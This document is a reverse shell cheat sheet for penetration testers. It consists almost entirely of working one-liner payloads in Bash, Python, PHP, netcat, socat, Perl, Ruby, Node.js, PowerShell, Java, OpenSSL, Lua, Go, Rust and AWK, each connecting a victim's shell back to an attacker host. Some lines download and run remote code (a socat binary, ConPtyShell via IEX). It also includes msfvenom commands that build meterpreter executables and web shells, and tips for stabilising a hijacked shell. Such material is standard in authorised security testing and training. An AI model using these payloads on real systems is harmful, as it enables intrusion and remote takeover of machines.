# Reverse Shell Cheat Sheet

A practical guide for penetration testers covering common reverse shell payloads and TTY upgrade techniques.

## Quick Start

**Set up your listener:**
```bash
nc -lvnp 4242
# Or with rlwrap for better shell handling
rlwrap nc -lvnp 4242
```

**Replace these in all examples:**
- `10.0.0.1` → Your IP address
- `4242` → Your listening port

---

## Bash

### TCP
```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

# Alternative
/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1

# Another variant
0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
```

### UDP
```bash
# Victim
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

# Listener
nc -u -lvnp 4242
```

---

## Python

### Standard (with PTY)
```python
export RHOST="10.0.0.1";export RPORT=4242;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Short version
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### IPv6
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

## PHP

```php
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/bash -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/bash -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/bash -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/bash -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/bash -i",array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

---

## Netcat

### Traditional
```bash
nc -e /bin/bash 10.0.0.1 4242
```

### OpenBSD
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

### BusyBox
```bash
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

### Ncat
```bash
ncat 10.0.0.1 4242 -e /bin/bash
ncat --udp 10.0.0.1 4242 -e /bin/bash
```

---

## Socat

### Listener (Attacker)
```bash
socat file:`tty`,raw,echo=0 TCP-L:4242
```

### Client (Victim)
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242

# Download and execute
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```

---

## Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

---

## Node.js

```javascript
require('child_process').exec('nc -e /bin/bash 10.0.0.1 4242')

// Alternative
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

---

## PowerShell

### One-liner
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### ConPtyShell (Fully Interactive - Windows 10+)
```powershell
# Listener
stty raw -echo; (stty size; cat) | nc -lvnp 4242

# Victim
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.1 4242
```

---

## Java

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

---

## OpenSSL

### Standard
```bash
# Attacker
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4242

# Victim
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
```

### TLS-PSK (No PKI required)
```bash
# Generate PSK
openssl rand -hex 48

# Listener
export LHOST="*"; export LPORT="4242"; export PSK="<generated_psk>"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT

# Victim
export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="<generated_psk>"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/bash -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
```

---

## Additional Languages

### Lua
```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/bash -i <&3 >&3 2>&3');"
```

### Golang
```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### Rust
```rust
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect("10.0.0.1:4242").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
```

### AWK
```bash
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

---

## TTY Shell Upgrade

### Method 1: Python PTY
```bash
# In reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
python3 -c "__import__('pty').spawn('/bin/bash')"

# Background the shell (Ctrl+Z)
^Z

# On your local machine
stty raw -echo; fg

# In the shell (if needed)
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

### Method 2: Script Command
```bash
# If 'su' requires a TTY
/usr/bin/script -qc /bin/bash /dev/null
```

### Method 3: Socat
```bash
# Use socat binary for automatic TTY
# (Download from https://github.com/andrew-d/static-binaries)
```

### Method 4: Other interpreters
```bash
perl -e 'exec "/bin/bash";'
ruby: exec "/bin/bash"
lua: os.execute('/bin/bash')
```

### Get terminal size
```bash
# On your machine
stty size
# Example output: 24 80

# In reverse shell after upgrade
stty rows 24 columns 80
```

---

## Msfvenom Payloads

### Linux
```bash
# Staged
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf > shell.elf

# Stageless
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf > shell.elf
```

### Windows
```bash
# Staged
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > shell.exe

# Stageless
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > shell.exe
```

### Web Shells
```bash
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f raw > shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > shell.war

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f asp > shell.asp
```

### macOS
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f macho > shell.macho
```

---

## Useful Tools

- **[reverse-shell-generator](https://www.revshells.com/)** - Online reverse shell generator
- **[revshellgen](https://github.com/t0thkr1s/revshellgen)** - CLI reverse shell generator
- **[rustcat](https://github.com/robiot/rustcat)** - Modern netcat alternative with auto-upgrade
- **[pwncat](https://github.com/calebstewart/pwncat)** - Advanced reverse shell handler

---

## Quick Reference

### Enhanced Listeners
```bash
# rlwrap (command history and editing)
rlwrap nc -lvnp 4242
rlwrap -cAr ncat -lvnp 4242

# pwncat (automatic upgrades)
pwncat-cs -lp 4242

# rustcat (automatic TTY upgrade)
rcat listen -ie "/usr/bin/script -qc /bin/bash /dev/null" 4242
```

### Tips
1. Always use `rlwrap` for better shell interaction
2. Check if Python is available for easy TTY upgrade
3. Use `script` command if `su` requires a TTY
4. For Windows 10+, ConPtyShell provides full interactivity
5. Test shells in order: Bash → Python → Netcat → Others

---

## Resources

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [PentestMonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [IppSec Shells Tutorial](https://www.youtube.com/watch?v=DLzxrzFCOe4)
